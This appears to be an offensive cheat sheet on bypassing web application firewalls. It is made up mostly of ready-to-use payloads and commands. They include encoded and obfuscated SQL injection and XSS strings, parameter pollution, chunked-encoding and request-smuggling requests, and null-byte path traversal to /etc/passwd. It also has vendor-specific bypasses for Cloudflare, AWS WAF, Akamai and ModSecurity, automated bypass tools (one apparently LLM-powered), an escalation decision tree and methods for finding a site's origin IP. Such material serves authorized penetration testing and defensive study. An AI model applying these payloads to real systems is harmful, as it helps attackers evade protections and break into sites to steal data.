# Advanced WAF Bypass — Complete Reference 2026

## WAF Detection & Fingerprinting

```bash
# Identify WAF vendor
wafw00f https://target.com
whatwaf -u https://target.com -a

# Manual fingerprint
# Check response headers for WAF signatures
curl -sI https://target.com | grep -i "cf-ray\|x-sucuri\|x-powered-by\|server"
# Cloudflare: cf-ray header
# Sucuri/CloudProxy: X-Sucuri-ID
# AWS WAF: x-amz-rid header
# Akamai: X-Akamai-Transformed
# F5: X-Content-Type-Options: nosniff
# ModSecurity: Apache/ mod_security in headers
```

## WAF Bypass Classification

### 1. Encoding & Obfuscation

```bash
# URL Encoding
%55NION%20%53ELECT                    # UNION SELECT
%27%20UNION%20SELECT%201%2C2%2C3--   # ' UNION SELECT 1,2,3--

# Double URL Encoding
%2555NION %2545LECT                   # Double encoded UNION SELECT

# Mixed Case
UnIoN sElEcT
uNiOn SeLeCt

# HTML Entity Encoding (XSS)
&#60;script&#62;alert(1)&#60;/script&#62;
&lsqb;script&rsqb;alert(1)&lsqb;/script&rsqb;

# Unicode Normalization
%uff55%uff4e%uff49%uff4f%uff4e     # U N I O N (fullwidth)
%C0%BCscript%C0%BE                  # Overlong UTF-8 for <script>

# Hex Encoding
0x55 0x4E 0x49 0x4F 0x4E            # UNION in hex
\ x55\ x4e\ x69\ x6f\ x6e

# Base64 (for XSS)
eval(atob('YWxlcnQoMSk='))           # alert(1) in base64

# JavaScript fromCharCode (XSS)
String.fromCharCode(97,108,101,114,116,40,49,41)  # alert(1)

# No-paren calls (XSS)
alert`1`
alert`document.cookie`
```

### 2. Comment Injection

```sql
/* SQLi comments */
' /**/UNION/**/SELECT/**/1,2,3--
' /*!UNION*/ /*!SELECT*/ 1,2,3--
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
' UN/**/ION SE/**/LECT 1,2,3--
'/**/OR/**/1=1--

/* XSS comments */
<scr<script>ipt>alert(1)</scr</script>ipt>
<<script>alert(1)</script>               # Tag double-open
```

### 3. Whitespace Alternatives

```sql
/* SQLi */
UNION%0ASELECT          # Newline
UNION%09SELECT          # Tab
UNION%0dSELECT          # Carriage return
UNION%0cSELECT          # Form feed
UNION%0bSELECT          # Vertical tab
UNION%A0SELECT          # Non-breaking space
UNION/**/SELECT         # Comment as whitespace

/* XSS */
<img%0Asrc=x%0Aonerror=alert(1)>   # Newlines in tags
<svg%0Conload=alert(1)>             # Form feed
```

### 4. HTTP Parameter Pollution (HPP)

```http
# Send multiple parameters — WAF checks first, app uses second
GET /search?id=1&id=2' UNION SELECT 1,2,3--

# PHP: last param wins
# ASP.NET: first param wins  
# Node.js/Express: array
# Java/Tomcat: first param wins

# HPP for auth bypass
GET /admin?role=user&role=admin
```

### 5. HTTP Method Manipulation

```http
# Method override
POST /api/delete-user
X-HTTP-Method-Override: DELETE

# Case variation
GeT /admin
Post /api/data
DeLeTe /api/user/1

# WebDAV methods
PROPFIND /admin
MKCOL /upload
MOVE /file
LOCK /config

# Debug methods
TRACE /admin
DEBUG /api
TRACK /login
```

### 6. Content-Type Confusion

```http
# Switch content types to bypass WAF rules
Content-Type: application/json
{"id":"1' OR '1'='1"}

Content-Type: application/xml
<id>1' OR '1'='1</id>

Content-Type: multipart/form-data; boundary=BOUNDARY
--BOUNDARY
Content-Disposition: form-data; name="id"
1' OR '1'='1
--BOUNDARY--

Content-Type: text/plain
1' OR '1'='1
```

### 7. Body Padding / Size Bypass

WAFs have an inspection size limit. Bypass by adding junk data:

```http
# Add junk prefix to push payload past WAF inspection window
POST /api/search
Content-Type: application/json

{"junk": "AAAA...[128KB of junk]...", "id": "1' OR '1'='1"}

# Tool: nowafplsV2 (Burp extension) automates this
# Supports: JSON, XML, multipart, CSV, YAML, GraphQL, NDJSON
```

### 8. Chunked Transfer Encoding

```http
# Split payload across chunks
POST /api/search HTTP/1.1
Transfer-Encoding: chunked

4
1' O
6
R '1'
4
='1
8
' -- -
0

# Each chunk is below WAF signature threshold
# WAF reassembles to: 1' OR '1'='1' -- -
```

### 9. Request Smuggling (HTTP/2 → HTTP/1.1 Desync)

```http
# CL.TE smuggling — Content-Length vs Transfer-Encoding
POST / HTTP/1.1
Host: target.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X

# TE.CL smuggling
# Attacker request is interpreted differently by front-end (proxy/WAF) vs back-end
```

### 10. Protocol Downgrade

```bash
# Force HTTP/1.0 — may bypass WAF rules that only inspect HTTP/1.1
curl -s --http1.0 "https://target.com/?id=1' OR '1'='1"

# HTTP/2 cleartext injection
# WAF sees HTTP/2 framing, but backend treats it differently
```

### 11. Case Normalization Bypass

WAFs normalize input before checking. Exploit normalization differences:

```http
# Server normalizes differently than WAF
/%2e%2e%2f%2e%2e%2fetc/passwd        # WAF sees encoded, server decodes to ../../
/%2e%2e/etc/passwd                     # Partial encoding
/%2E%2E%2Fetc%2Fpasswd                 # Inconsistent case
```

### 12. Null Byte Injection

```http
# Null byte truncates payload for WAF, but app continues
?id=1' UNION SELECT 1,2,3%00-- -
# WAF stops at %00, sees only: 1' UNION SELECT 1,2,3
# But server may continue processing after null byte

# Null byte in paths
../../../etc/passwd%00.jpg
# WAF sees .jpg extension → allows it
# Server truncates at %00 → path traversal
```

## Vendor-Specific Bypasses

### Cloudflare
```bash
# Obscure event handlers that Cloudflare doesn't block
<details open ontoggle=alert(1)>
<object onerror=alert(1)>
<image src=x onpointerover=alert(1)>
<textarea autofocus onfocus=alert(1)>
<body onafterprint=alert(1)>
<video onpointerenter=alert(1)>
```

### AWS WAF
```bash
# Double/mixed encoding
?q=%2527%2520OR%25201%253D1--
# First decode: %27%20OR%201%3D1--
# Second decode: ' OR 1=1--

# Unconventional whitespace
?q=1'%E2%80%80OR%E2%80%801=1--   # Using Mongolian vowel separator
?q=1'%C2%A0OR%C2%A01=1--         # Non-breaking space
```

### Akamai
```bash
# Polyglots that avoid "script" keyword
<svg onload=alert(1)>
<isindex action=javascript:alert(1) type=image>
<body onload=alert(1)>
```

### ModSecurity / OWASP CRS
```bash
# Lower paranoia levels (PL1-PL2) miss these
# Case-split keywords
'SeLeCt 1,2,3 FrOm users WhErE 1=1--

# Entity-encoded javascript:
javascript&#58;alert(1)
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)

# Newline in critical places
<scr%0Aipt>alert(1)</scr%0Aipt>
```

### F5 BIG-IP
```bash
# HTTP/2 cleartext injection
# Request smuggling via HTTP/2 to HTTP/1.1 translation
# TLS fingerprinting bypass
```

## Automated WAF Bypass Tools

### bypassburrito (Go, LLM-powered)
```bash
# LLM generates WAF bypass payloads via mutation
burrito bypass -u "https://target.com/api" --param id --type sqli
burrito bypass -u "https://target.com/api" --param q --type xss --waf-type cloudflare
burrito bypass -u "https://target.com/api" --param id --type sqli -f markdown -o report.md
```

### wafrift (Python, evolutionary engine)
```bash
# Evolutionary WAF bypass: hill-climb / SA / tabu / novelty / MAP-Elites
wafrift scan --url "https://target.com/?id=1" --param id --payload "' OR '1'='1"
wafrift hunt --target cumulusfire --campaign-id mycampaign
```

### evilwaf (Python, MITM proxy)
```bash
# Transparent MITM Firewall bypass proxy
# HTTP/2 fingerprint rotation, Cloudflare header injection, origin IP hunter
evilwaf --target https://target.com --proxy http://127.0.0.1:8080
```

### nowafplsV2 (Burp Extension, Java)
```bash
# WAF size-limit bypass via junk data injection
# Supports: JSON, XML, multipart, CSV, YAML, GraphQL, NDJSON
# Auto-injects into Burp Scanner + DAST
```

### WAFNinja (Burp Extension, ML-powered)
```bash
# 53 advanced bypass techniques including:
# - Unicode normalization, double encoding, null byte
# - HPP, method override, content-type confusion
# - Chunked encoding, pipeline abuse
# - Timing attacks, race conditions, cache poisoning
# - Request smuggling, response splitting
# - 12 payload obfuscation strategies
# - 8 encoding mutation types
# - Header manipulation (inject/randomize/case/duplicate)
# - Request fragmentation (chunked/compressed/encoded)
```

## WAF Bypass Decision Tree

```
Is payload blocked?
├── Yes → Try encoding layer 1 (URL encode)
│   ├── Still blocked → Try encoding layer 2 (double URL)
│   │   ├── Still blocked → Try comment injection
│   │   │   ├── Still blocked → Try whitespace tricks
│   │   │   │   ├── Still blocked → Try HPP
│   │   │   │   │   ├── Still blocked → Try chunked encoding
│   │   │   │   │   │   ├── Still blocked → Try body padding
│   │   │   │   │   │   │   ├── Still blocked → Try protocol downgrade
│   │   │   │   │   │   │   │   ├── Still blocked → Try smuggled request
│   │   │   │   │   │   │   │   │   ├── Still blocked → Use bypassburrito/wafrift
│   │   │   │   │   │   │   │   │   │   └── Still blocked → Look for origin IP (direct bypass)
│   │   │   │   │   │   │   │   │   └── Works → Report as WAF bypass
│   │   │   │   │   │   │   │   └── Works → Protocol downgrade bypass
│   │   │   │   │   │   │   └── Works → Body size bypass
│   │   │   │   │   │   └── Works → Chunked encoding bypass
│   │   │   │   │   └── Works → HPP bypass
│   │   │   │   └── Works → Whitespace bypass
│   │   │   └── Works → Comment injection bypass
│   │   └── Works → Double encoding bypass
│   └── Works → URL encoding bypass
└── No → Send payload, confirm vulnerability
```

## Origin IP Discovery (bypass WAF entirely)

If WAF is too strong, find the real server IP:

```bash
# Shodan search
shodan search "hostname:target.com" --fields ip_str,port
shodan search "org:Target Company" --fields ip_str,port

# Censys
# Search for certificates matching target.com

# Historical DNS
dig target.com ANY
# Check historical DNS records for old IPs

# Cloud data
# Check: S3 bucket DNS, CloudFront, Elastic Load Balancer
# Target may have CNAME to origin that leaks IP

# Email headers
# Send email to non-existent user @target.com
# Check Received: headers for origin IP

# SSL certificate transparency
# Search for target.com SSL certs → extract IPs

# Subdomain DNS
# Find subdomain pointing directly to IP (not through WAF)
# e.g., dev.target.com → 203.0.113.5 (origin IP)

# Tools
# evilwaf has built-in origin IP hunter (10 parallel scanners)
# wafw00f can sometimes leak origin IP
```
